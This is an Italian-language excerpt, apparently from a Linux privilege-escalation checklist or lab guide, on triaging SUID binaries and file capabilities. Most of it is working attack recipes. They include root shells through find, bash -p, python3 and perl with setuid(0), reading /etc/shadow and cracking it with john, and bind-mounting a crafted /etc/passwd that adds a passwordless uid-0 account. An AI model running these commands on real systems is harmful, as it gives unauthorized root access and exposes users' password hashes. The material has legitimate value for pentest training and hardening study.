...
|---|---|---|
| `X`/`+` su binario | `getcap <file>` | capability vuota (falso positivo, `mycapfake`), o capability reale ma inutile (`cap_mknod`, `cap_audit_read`); **ATTENZIONE**: `cap_setuid`/`cap_dac_read_search`/`cap_sys_admin` NON sono inutili (vedi lista sotto e guida §3.2) |
...
| `p` = SUID nuovo | `ls -l <file>` (cerca `s`) | il binario non scrive file utili **e non è un binario-shell GTFOBins** — `yes`/`whoami`/`sort` sì (rumore), ma `find`/`python`/`bash`/`vim` NO (shell root diretta, guida §3.1) |
...
- `cap_setuid` su un **interprete** (`python3`, `perl`) o shell → `setuid(0)` → shell root diretta.
- `cap_dac_read_search` su un binario → legge qualunque file (`/etc/shadow`) → crack offline (john).
- `cap_sys_admin` su `mount`/un interprete → `mount --bind` di un passwd craftato sopra `/etc/passwd`.
...
- **SUID** su un **binario-shell GTFOBins** (`find`/`python`/`bash`/`vim`) → shell root diretta
  (ricetta al passo 7; ricorda il `-p`/`setuid(0)`, altrimenti la shell rilascia l'euid).
...
**SUID o cap_setuid su un binario-shell/interprete (shell root diretta — GTFOBins)**
```
# SUID su find/bash/python/vim (il -p/setuid è indispensabile: senza, la shell rilascia l'euid):
find . -exec /bin/sh -p \; -quit
bash -p
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'      # vale anche per cap_setuid su python3
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'
id                                                              # uid=0(root)
```

**cap_dac_read_search su un binario (lettura shadow → crack offline)**
```
cat /etc/shadow                                                # leggibile grazie alla cap
unshadow /etc/passwd /etc/shadow > /tmp/f
john -format=crypt -wordlist=/usr/share/wordlists/rockyou.txt /tmp/f     # poi su <utente> crackato
```

**cap_sys_admin su mount/interprete (bind-mount di un passwd craftato)**
```
cp /etc/passwd /tmp/passwd
echo "toor::0:0::/root:/bin/bash" >> /tmp/passwd
mount --bind /tmp/passwd /etc/passwd                           # non modifica l'inode reale
su toor
```
